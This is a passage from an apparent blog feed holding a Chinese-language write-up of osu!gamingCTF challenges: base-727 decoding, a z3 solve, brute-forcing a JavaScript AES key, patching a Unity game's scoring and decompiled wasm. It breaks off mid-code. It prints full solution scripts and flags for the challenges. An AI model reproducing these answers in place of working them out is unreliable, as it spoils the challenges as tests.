<h2 id="technically-correct-ELF文件格式"><a href="#technically-correct-ELF文件格式" class="headerlink" title="technically-correct | ELF文件格式"></a>technically-correct | ELF文件格式</h2><p><a href="https://1k0ct.github.io/2024/03/16/ELF%E6%96%87%E4%BB%B6%E5%A4%B4/#%E5%BA%94%E7%94%A8%E5%9C%BA%E5%90%88">ELF文件头格式分析</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉大部分的题目考验的都是对代码的理解 并没有涉及非常神必的加密</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>REV</category>
        <category>WPs</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>osu!gamingCTF部分wp</title>
    <url>/2024/03/04/osu-gamingCTF%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<p>参赛ID:1K0CT</p>
<p>email: <a href="mailto:&#x6f;&#107;&#117;&#x75;&#x73;&#117;&#x6b;&#x75;&#64;&#x67;&#109;&#x61;&#105;&#108;&#46;&#99;&#111;&#109;">&#x6f;&#107;&#117;&#x75;&#x73;&#117;&#x6b;&#x75;&#64;&#x67;&#109;&#x61;&#105;&#108;&#46;&#99;&#111;&#109;</a></p>
<p>笑点解析:osu有CTF CTF有osu</p>
<span id="more"></span>

<h2 id="Crypto-base727-base编码-编码转化"><a href="#Crypto-base727-base编码-编码转化" class="headerlink" title="Crypto&#x2F;base727 | base编码 | 编码转化"></a>Crypto&#x2F;base727 | base编码 | 编码转化</h2><p>题目给出的加密脚本和结果:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_base_727</span>(<span class="params">string</span>):</span><br><span class="line">    base = <span class="number">727</span></span><br><span class="line">    encoded_value = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        encoded_value = encoded_value * <span class="number">256</span> + <span class="built_in">ord</span>(char)</span><br><span class="line"></span><br><span class="line">    encoded_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> encoded_value &gt; <span class="number">0</span>:</span><br><span class="line">        encoded_string = <span class="built_in">chr</span>(encoded_value % base) + encoded_string</span><br><span class="line">        encoded_value //= base</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encoded_string</span><br><span class="line"></span><br><span class="line">encoded_string = encode_base_727(flag)</span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(encoded_string.encode()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 06c3abc49dc4b443ca9d65c8b0c386c4b0c99fc798c2bdc5bccb94c68c37c296ca9ac29ac790c4af7bc585c59d</span></span><br></pre></td></tr></table></figure>

<p><code>chr()</code>函数将参数转化为对应的Unicode字符 而<code>.encode()</code>方法将该字符转化为UTF-8编码 所以不能直接将结果<code>unhexlify</code>后进行解密 而需要先进行UTF-8解码 关于加密的逻辑 无非是10进制-&gt;256进制-&gt;727进制 倒推即可 以下是解密脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base_727</span>(<span class="params">encoded_string</span>):</span><br><span class="line">    base = <span class="number">727</span></span><br><span class="line">    decoded_value = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> encoded_string:</span><br><span class="line">        decoded_value = decoded_value * base + <span class="built_in">ord</span>(char)</span><br><span class="line"></span><br><span class="line">    decoded_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> decoded_value &gt; <span class="number">0</span>:</span><br><span class="line">        decoded_string = <span class="built_in">chr</span>(decoded_value % <span class="number">256</span>) + decoded_string</span><br><span class="line">        decoded_value //= <span class="number">256</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decoded_string</span><br><span class="line"></span><br><span class="line">encoded = binascii.unhexlify(<span class="string">b&#x27;06c3abc49dc4b443ca9d65c8b0c386c4b0c99fc798c2bdc5bccb94c68c37c296ca9ac29ac790c4af7bc585c59d&#x27;</span>).decode(encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(decode_base_727(encoded))</span><br><span class="line"></span><br><span class="line"><span class="comment"># osu&#123;wysiwysiwysiywsywiwywsi&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Reverse-SAT-before-osu-z3"><a href="#Reverse-SAT-before-osu-z3" class="headerlink" title="Reverse&#x2F;SAT-before-osu | z3"></a><strong>Reverse</strong>&#x2F;SAT-before-osu | z3</h2><p>直接将题目给出的关系塞到z3求解器中:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sol = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the variables</span></span><br><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">b = Int(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">c = Int(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">d = Int(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">e = Int(<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">f = Int(<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line">g = Int(<span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">h = Int(<span class="string">&#x27;h&#x27;</span>)</span><br><span class="line">i = Int(<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">j = Int(<span class="string">&#x27;j&#x27;</span>)</span><br><span class="line">k = Int(<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">l = Int(<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">m = Int(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line">n = Int(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">o = Int(<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">p = Int(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">q = Int(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">r = Int(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">s = Int(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">t = Int(<span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">u = Int(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">v = Int(<span class="string">&#x27;v&#x27;</span>)</span><br><span class="line">w = Int(<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">x = Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y = Int(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">z = Int(<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sol.add(b + c + w == <span class="number">314</span>)</span><br><span class="line">sol.add(t + d + u == <span class="number">290</span>)</span><br><span class="line">sol.add(p + w + e == <span class="number">251</span>)</span><br><span class="line">sol.add(v + l + j == <span class="number">274</span>)</span><br><span class="line">sol.add(a + t + b == <span class="number">344</span>)</span><br><span class="line">sol.add(b + j + m == <span class="number">255</span>)</span><br><span class="line">sol.add(h + o + u == <span class="number">253</span>)</span><br><span class="line">sol.add(q + l + o == <span class="number">316</span>)</span><br><span class="line">sol.add(a + g + j == <span class="number">252</span>)</span><br><span class="line">sol.add(q + x + q == <span class="number">315</span>)</span><br><span class="line">sol.add(t + n + m == <span class="number">302</span>)</span><br><span class="line">sol.add(d + b + g == <span class="number">328</span>)</span><br><span class="line">sol.add(e + o + m == <span class="number">246</span>)</span><br><span class="line">sol.add(v + v + u == <span class="number">271</span>)</span><br><span class="line">sol.add(f + o + q == <span class="number">318</span>)</span><br><span class="line">sol.add(s + o + j == <span class="number">212</span>)</span><br><span class="line">sol.add(j + j + n == <span class="number">197</span>)</span><br><span class="line">sol.add(s + u + l == <span class="number">213</span>)</span><br><span class="line">sol.add(q + w + j == <span class="number">228</span>)</span><br><span class="line">sol.add(i + d + r == <span class="number">350</span>)</span><br><span class="line">sol.add(e + k + u == <span class="number">177</span>)</span><br><span class="line">sol.add(w + n + a == <span class="number">288</span>)</span><br><span class="line">sol.add(r + e + u == <span class="number">212</span>)</span><br><span class="line">sol.add(q + l + f == <span class="number">321</span>)</span><br><span class="line"></span><br><span class="line">sol.check()</span><br><span class="line">answer = [a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z]</span><br><span class="line"><span class="keyword">while</span> sol.check() == sat:</span><br><span class="line">    m = sol.model()</span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> answer:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            value = m[letter].as_long()</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(value), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    condition = []</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> m:</span><br><span class="line">        condition.append(d() != m[d])</span><br><span class="line">    sol.add(Or(condition))</span><br><span class="line"><span class="comment"># osu&#123;0rZ_p3PpY_my_s4v1oR&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Reverse-wysi-baby-js逆向-爆破"><a href="#Reverse-wysi-baby-js逆向-爆破" class="headerlink" title="Reverse&#x2F;wysi-baby | js逆向 | 爆破"></a>Reverse&#x2F;wysi-baby | js逆向 | 爆破</h2><p>网站源码:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">wysi</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (combos.<span class="property">length</span> === <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> cs = combos.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> csr = cs + cs.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> res = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(<span class="string">&quot;5LJJj+x+/cGxhxBTdj/Q2RxkhgbH7v8b/IgX9Kjptpo=&quot;</span>, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span>.<span class="title function_">parse</span>(csr + csr), &#123; <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span> &#125;).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>);</span><br><span class="line">    <span class="comment">// if prefix is &quot;osu&#123;&quot; then its correct</span></span><br><span class="line">    <span class="keyword">if</span> (res.<span class="title function_">startsWith</span>(<span class="string">&quot;osu&#123;&quot;</span>)) &#123;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;music&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;audio src=&quot;./wysi.mp3&quot; autoplay&gt;&lt;/audio&gt;&#x27;</span>;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// reset</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;nope.&quot;</span>);</span><br><span class="line">      combos = [];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  $(<span class="string">&quot;#frame&quot;</span>).<span class="title function_">on</span>(<span class="string">&quot;click&quot;</span>, <span class="string">&quot;button&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> buttonValue = $(<span class="variable language_">this</span>).<span class="title function_">data</span>(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">    combos.<span class="title function_">push</span>(buttonValue);</span><br><span class="line">    <span class="title function_">wysi</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>核心逻辑是检测点击的按钮来向<code>combos</code>压入按钮对应的值 然后当<code>combos</code>的长度为8时通过连接<code>combos</code>和<code>combos[::-1]</code> 再连接自身来构成32位密钥进行AES解密 直接爆破</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; <span class="number">10</span>; k++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> l = <span class="number">0</span>; l &lt; <span class="number">10</span>; l++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> m = <span class="number">0</span>; m &lt; <span class="number">10</span>; m++) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; <span class="number">10</span>; n++) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="number">0</span>; o &lt; <span class="number">10</span>; o++) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (<span class="keyword">var</span> p = <span class="number">0</span>; p &lt; <span class="number">10</span>; p++) &#123;</span><br><span class="line">                                combos = [i, j, k, l, m, n, o, p]</span><br><span class="line">                                <span class="keyword">var</span> cs = combos.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                                <span class="keyword">var</span> csr = cs + cs.<span class="title function_">split</span>(<span class="string">&quot;&quot;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                                <span class="keyword">try</span>&#123;<span class="keyword">var</span> res = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(<span class="string">&quot;5LJJj+x+/cGxhxBTdj/Q2RxkhgbH7v8b/IgX9Kjptpo=&quot;</span>, <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span>.<span class="title function_">parse</span>(csr + csr), &#123; <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">ECB</span> &#125;).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>);&#125;</span><br><span class="line">                                <span class="keyword">catch</span>(err)&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">                                <span class="keyword">if</span> (res.<span class="title function_">startsWith</span>(<span class="string">&quot;osu&#123;&quot;</span>)) &#123;</span><br><span class="line">                                  <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// osu&#123;baby_js_osu_web_uwu&#125;</span></span><br></pre></td></tr></table></figure>

<p>(正常来说可以用python遍历1~100000000高位填充0来解密 但是不知道为什么没爆出来)</p>
<h2 id="Reverse-ecs-catch-Unity游戏逆向"><a href="#Reverse-ecs-catch-Unity游戏逆向" class="headerlink" title="Reverse&#x2F;ecs!catch | Unity游戏逆向"></a>Reverse&#x2F;ecs!catch | Unity游戏逆向</h2><p>题目描述:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Receive an SS (with maximum score) on &quot;Bakamitai&quot;, the hardest map, to receive the flag. Shouldn&#x27;t be too difficult, right?</span><br><span class="line"></span><br><span class="line">Note: An SS is not enough! The remote has additional checks for specific scoring (the maximum score if SS&#x27;ed &quot;legitimately&quot;).</span><br><span class="line"></span><br><span class="line">Note: This executable is built for x86 Windows.</span><br></pre></td></tr></table></figure>

<p>说明这是32位的Unity引擎制作的游戏 并且目标是达到某个特定的分值而不是超过某个分值 游戏就是osu的catch模式 直接找到和碰撞处理相关的函数<code>OnTriggerEnter2D</code>和<code>OnTriggerExit2D</code> 既然游戏要达到某个分值而不是越高越好那么直接将Missed判定接入Activator判定中 删除Missed判定的逻辑:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/03/04/20240304-193313.png" alt="image-20240304193305920"></p>
<p>如果遇到箭头指的对象报错就先导入<code>UnityEngine.dll</code> 然后保存模块进入游戏按题目的要求打难度最高的歌拿到flag:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/03/04/20240304-193712.png" alt="image-20240304193712962"></p>
<h2 id="Reverse-wysi-revenge-js逆向-wasm"><a href="#Reverse-wysi-revenge-js逆向-wasm" class="headerlink" title="Reverse&#x2F;wysi-revenge | js逆向 | wasm"></a>Reverse&#x2F;wysi-revenge | js逆向 | wasm</h2><p>网站源码:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">wysi</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (combos.<span class="property">length</span> === <span class="number">12</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> cs = combos.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="title class_">Module</span>().<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">mod</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> ck = mod.<span class="title function_">cwrap</span>(<span class="string">&#x27;checker&#x27;</span>, <span class="string">&#x27;boolean&#x27;</span>, [<span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;number&#x27;</span>]);</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_">ck</span>(cs,  cs.<span class="property">length</span>)) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;music&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;audio src=&quot;./wysi.mp3&quot; autoplay&gt;&lt;/audio&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;osu&#123;&quot;</span> + cs + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;nope.&quot;</span>);</span><br><span class="line">        combos = [];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  $(<span class="string">&quot;#frame&quot;</span>).<span class="title function_">on</span>(<span class="string">&quot;click&quot;</span>, <span class="string">&quot;button&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> buttonValue = $(<span class="variable language_">this</span>).<span class="title function_">data</span>(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">    combos.<span class="title function_">push</span>(buttonValue);</span><br><span class="line">    <span class="title function_">wysi</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>基本逻辑类似<code>wysi-baby</code> 但是使用到了Js内联C&#x2F;C++ 所以部分功能是由wasm实现的(这一点通过网页开发者工具调试得知) 一路步入到核心检查逻辑<code>cheker()</code>发现存在于<code>checker.wasm</code> 复制代码保存到本地为<code>.wat</code>(明文形式的wasm代码) 用wabt工具箱将其转化为可读性更高的<code>.o</code>文件 得到原始代码:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> memory <span class="title function_">memory</span>(<span class="attr">initial</span>: <span class="number">256</span>, <span class="attr">max</span>: <span class="number">32768</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">global</span> <span class="attr">g_a</span>:int = <span class="number">65536</span>;</span><br><span class="line"><span class="variable language_">global</span> <span class="attr">g_b</span>:int = <span class="number">0</span>;</span><br><span class="line"><span class="variable language_">global</span> <span class="attr">g_c</span>:int = <span class="number">0</span>;</span><br><span class="line"><span class="variable language_">global</span> <span class="attr">g_d</span>:int = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> table <span class="attr">indirect_function_table</span>:<span class="title function_">funcref</span>(<span class="attr">min</span>: <span class="number">1</span>, <span class="attr">max</span>: <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">wasm_call_ctors</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">emscripten_stack_init</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f_b</span>(<span class="params">a:int, b:int, c:int, d:int</span>):int &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">e</span>:int = g_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">f</span>:int = <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">g</span>:&#123; <span class="attr">a</span>:int, <span class="attr">b</span>:int, <span class="attr">c</span>:int, <span class="attr">d</span>:int &#125; = e - f;</span><br><span class="line">  g.<span class="property">d</span> = a;</span><br><span class="line">  g.<span class="property">c</span> = b;</span><br><span class="line">  g.<span class="property">b</span> = c;</span><br><span class="line">  g.<span class="property">a</span> = d;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">h</span>:int = g.<span class="property">d</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">i</span>:int = <span class="number">22</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">j</span>:int = h;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">k</span>:int = i;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">l</span>:int = j == k;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">m</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">n</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">o</span>:int = l &amp; n;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">p</span>:int = m;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(o)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">q</span>:int = g.<span class="property">c</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">r</span>:int = g.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">s</span>:int = q + r;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">t</span>:int = <span class="number">30</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">u</span>:int = s;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">v</span>:int = t;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">w</span>:int = u == v;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">x</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">y</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">z</span>:int = w &amp; y;</span><br><span class="line">  p = x;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(z)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">aa</span>:int = g.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ba</span>:int = g.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ca</span>:int = aa * ba;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">da</span>:int = <span class="number">168</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ea</span>:int = ca;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">fa</span>:int = da;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ga</span>:int = ea == fa;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ha</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ia</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ja</span>:int = ga &amp; ia;</span><br><span class="line">  p = ha;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(ja)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ka</span>:int = g.<span class="property">d</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">la</span>:int = g.<span class="property">c</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ma</span>:int = ka + la;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">na</span>:int = g.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">oa</span>:int = ma + na;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">pa</span>:int = g.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">qa</span>:int = oa + pa;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ra</span>:int = <span class="number">66</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">sa</span>:int = qa;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ta</span>:int = ra;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ua</span>:int = sa == ta;</span><br><span class="line">  p = ua;</span><br><span class="line">  label <span class="attr">B_a</span>:</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">va</span>:int = p;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">wa</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">xa</span>:int = va &amp; wa;</span><br><span class="line">  <span class="keyword">return</span> xa;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f_c</span>(<span class="params">a:int, b:int, c:int, d:int, e:int</span>):int &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">f</span>:int = g_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">g</span>:int = <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">h</span>:int_ptr = f - g;</span><br><span class="line">  h[<span class="number">7</span>] = a;</span><br><span class="line">  h[<span class="number">6</span>] = b;</span><br><span class="line">  h[<span class="number">5</span>] = c;</span><br><span class="line">  h[<span class="number">4</span>] = d;</span><br><span class="line">  h[<span class="number">3</span>] = e;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">i</span>:int = h[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">j</span>:int = h[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">k</span>:int = i + j;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">l</span>:int = h[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">m</span>:int = k + l;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">n</span>:int = h[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">o</span>:int = m + n;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">p</span>:int = h[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">q</span>:int = o + p;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">r</span>:int = <span class="number">71</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">s</span>:int = q;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">t</span>:int = r;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">u</span>:int = s == t;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">v</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">w</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">x</span>:int = u &amp; w;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">y</span>:int = v;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(x)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">z</span>:int = h[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">aa</span>:int = h[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ba</span>:int = z * aa;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ca</span>:int = h[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">da</span>:int = ba * ca;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ea</span>:int = h[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">fa</span>:int = da * ea;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ga</span>:int = 